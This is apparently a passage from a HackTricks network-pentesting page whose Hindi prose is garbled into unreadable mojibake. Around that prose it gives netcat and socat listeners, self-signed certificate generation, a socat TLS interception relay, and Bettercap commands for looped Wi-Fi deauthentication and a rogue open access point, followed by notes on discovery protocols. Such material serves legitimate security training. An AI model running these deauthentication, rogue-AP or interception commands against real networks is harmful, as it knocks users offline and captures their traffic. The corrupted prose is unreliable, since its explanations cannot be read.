**sslStrip рдпрд╛ sslStrip+ рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ рдмреНрд░рд╛рдЙрдЬрд╝рд░реЛрдВ рдореЗрдВ HSTS рдирд┐рдпрдо рдкрд╣рд▓реЗ рд╕реЗ рд╕рд╣реЗрдЬреЗ рдЧрдП рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рднрд▓реЗ рд╣реА рдпрд╣ рдкрд╣рд▓реА рдмрд╛рд░ рд╣реЛ рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ "рдорд╣рддреНрд╡рдкреВрд░реНрдг" рдбреЛрдореЗрди рддрдХ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ, рд╡рд╣ рдЗрд╕реЗ HTTPS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд╣рд▓реЗ рд╕реЗ рд╕рд╣реЗрдЬреЗ рдЧрдП рдирд┐рдпрдо рдФрд░ рдЕрдиреНрдп рдЙрддреНрдкрдиреНрди рдирд┐рдпрдо рдлреНрд▓реИрдЧ** [**`includeSubdomains`**](https://hstspreload.appspot.com) **рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП** _**wwww.facebook.com**_ **рдЙрджрд╛рд╣рд░рдг рдЕрдм рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐** _**facebook.com**_ **`includeSubdomains` рдХреЗ рд╕рд╛рде HSTS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP рдкреЛрд░реНрдЯ рдореЗрдВ рд╕реБрдирдирд╛
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL listen in port

#### рдХреБрдВрдЬреА рдФрд░ рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрдиреЗрдВ
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реБрдиреЗрдВ рдФрд░ рд╣реЛрд╕реНрдЯреЛрдВ рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░реЗрдВ
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
рдХрднреА-рдХрднреА, рдпрджрд┐ рдХреНрд▓рд╛рдЗрдВрдЯ рдпрд╣ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ CA рдПрдХ рдорд╛рдиреНрдп рд╣реИ, рддреЛ рдЖрдк **рдПрдХ рдЕрдиреНрдп рд╣реЛрд╕реНрдЯрдирд╛рдо рдХрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЬреЛ CA рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рд╣реИ** рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдПрдХ рдФрд░ рджрд┐рд▓рдЪрд╕реНрдк рдкрд░реАрдХреНрд╖рдг рд╣реИ, **рдЕрдиреБрд░реЛрдзрд┐рдд рд╣реЛрд╕реНрдЯрдирд╛рдо рдХрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рд▓реЗрдХрд┐рди рд╕реНрд╡-рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд** рдкреНрд░рджрд╛рди рдХрд░рдирд╛ред

рдЕрдиреНрдп рдЪреАрдЬреЗрдВ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЛ рдПрдХ рдорд╛рдиреНрдп рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рдирд╛ рдЬреЛ рдПрдХ рдорд╛рдиреНрдп CA рдирд╣реАрдВ рд╣реИред рдпрд╛ рдорд╛рдиреНрдп рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛, рдПрдХ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЗ рд░реВрдк рдореЗрдВ рдбрд┐рдлреА рд╣реЗрд▓рдореИрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░рдирд╛ (рдПрдХ рдРрд╕рд╛ рдЬреЛ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдХреБрдЫ рднреА рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ) рдФрд░ рдЬрдм рдХреНрд▓рд╛рдЗрдВрдЯ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдПрдХ рдкреНрд░реЙрдм (рдЬреИрд╕реЗ рдПрдХ рд╣реИрд╢) рдорд╛рдВрдЧрддрд╛ рд╣реИ, рддреЛ рдПрдХ рдирдХрд▓реА рдкреНрд░реЙрдм рднреЗрдЬрдирд╛ рдФрд░ рдЙрдореНрдореАрдж рдХрд░рдирд╛ рдХрд┐ рдХреНрд▓рд╛рдЗрдВрдЯ рдЗрд╕реЗ рдирд╣реАрдВ рдЬрд╛рдВрдЪреЗрдЧрд╛ред

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Active Discovery Notes

рдпрд╣ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦреЗрдВ рдХрд┐ рдЬрдм рдПрдХ UDP рдкреИрдХреЗрдЯ рдПрдХ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЕрдиреБрд░реЛрдзрд┐рдд рдкреЛрд░реНрдЯ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдПрдХ ICMP (Port Unreachable) рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред

### **ARP discover**

ARP рдкреИрдХреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рдХреМрди рд╕реЗ IPs рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред PC рдХреЛ рдкреНрд░рддреНрдпреЗрдХ рд╕рдВрднрд╛рд╡рд┐рдд IP рдкрддреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬрдирд╛ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдХреЗрд╡рд▓ рд╡рд╣реА рдЬреЛ рдЙрдкрдпреЛрдЧ рдореЗрдВ рд╣реИрдВ, рдЙрддреНрддрд░ рджреЗрдВрдЧреЗред

### **mDNS (multicast DNS)**

Bettercap рдПрдХ MDNS рдЕрдиреБрд░реЛрдз рднреЗрдЬрддрд╛ рд╣реИ (рдкреНрд░рддреНрдпреЗрдХ X ms) **\_services\_.dns-sd.\_udp.local** рдХреЗ рд▓рд┐рдП, рдЬреЛ рдорд╢реАрди рдЗрд╕ рдкреИрдХреЗрдЯ рдХреЛ рджреЗрдЦрддреА рд╣реИ, рдЖрдорддреМрд░ рдкрд░ рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХрд╛ рдЙрддреНрддрд░ рджреЗрддреА рд╣реИред рдлрд┐рд░, рдпрд╣ рдХреЗрд╡рд▓ "services" рдХрд╛ рдЙрддреНрддрд░ рджреЗрдиреЗ рд╡рд╛рд▓реА рдорд╢реАрдиреЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рддреА рд╣реИред

**Tools**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap рдкреЛрд░реНрдЯ 137/UDP рдкрд░ "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA" рдирд╛рдо рдХреЗ рд▓рд┐рдП рдкреВрдЫрддреЗ рд╣реБрдП рдкреИрдХреЗрдЯ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИред

### **SSDP (Simple Service Discovery Protocol)**

Bettercap SSDP рдкреИрдХреЗрдЯ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ (UDP рдкреЛрд░реНрдЯ 1900)ред

### **WSD (Web Service Discovery)**

Bettercap WSD рдкреИрдХреЗрдЯ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ (UDP рдкреЛрд░реНрдЯ 3702)ред

## References

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3rd edition)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
